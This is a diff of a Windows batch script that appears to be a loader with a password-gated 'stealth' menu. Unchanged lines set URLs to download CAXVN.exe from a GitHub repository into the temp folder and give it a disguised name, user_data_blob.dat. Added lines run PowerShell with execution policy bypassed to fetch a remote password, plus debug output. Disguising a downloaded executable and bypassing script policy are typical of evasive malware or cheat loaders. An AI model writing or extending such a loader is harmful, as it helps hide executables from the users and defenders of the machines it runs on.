@@ -6,7 +6,6 @@ set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/re
 set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
 set "SETUP_EXE=%temp%\CAXVN.exe"
 set "DISGUISED_EXE=%temp%\user_data_blob.dat"
-:: TMPPASS removed as it's not used in the direct variable setting approach, or previous file-based approach.
 
 :: Use best available PowerShell
 set "PWSH=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
@@ -29,11 +28,38 @@ if "%userpass%"=="1" (
 :: === Check Remote Stealth Password ===
 echo [*] Verifying credentials with server...
 
-:: IMPORTANT: Using the robust PowerShell environment variable setting approach
-:: to avoid the 'C:\Program' error.
 if not exist "%PWSH%" (
     echo [!] ERROR: PowerShell not found to verify secret password.
     echo Please ensure PowerShell is installed at: "%PWSH%"
+    timeout /t 2 >nul
+    goto LOGIN
+)
+
+:: --- DEBUGGING START ---
+echo DEBUG: User entered: "%userpass%"
+echo DEBUG: Attempting to download password from: %STEALTH_PASS_URL%
+echo DEBUG: PowerShell command to execute: "%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "$webContent = (Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim(); [Environment]::SetEnvironmentVariable('REMOTE_PASS_TEMP_VAR', $webContent, 'Process')"
+pause
+:: --- DEBUGGING END ---
+
+"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "$webContent = (Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim(); [Environment]::SetEnvironmentVariable('REMOTE_PASS_TEMP_VAR', $webContent, 'Process')" >nul 2>&1
+
+:: Get the value from the environment variable set by PowerShell
+set "REMOTE_PASS=!REMOTE_PASS_TEMP_VAR!"
+
+:: Clear the temporary environment variable
+set "REMOTE_PASS_TEMP_VAR="
+
+:: --- DEBUGGING START ---
+echo DEBUG: Retrieved remote password: "%REMOTE_PASS%"
+echo DEBUG: Comparing "%userpass%" (User Input) with "%REMOTE_PASS%" (Remote)
+pause
+:: --- DEBUGGING END ---
+
+if /i "%userpass%"=="%REMOTE_PASS%" (
+    goto STEALTH_MENU
+) else (
+    echo [!] Incorrect password. Try again.
     timeout /t 2 >nul
     goto LOGIN
 )
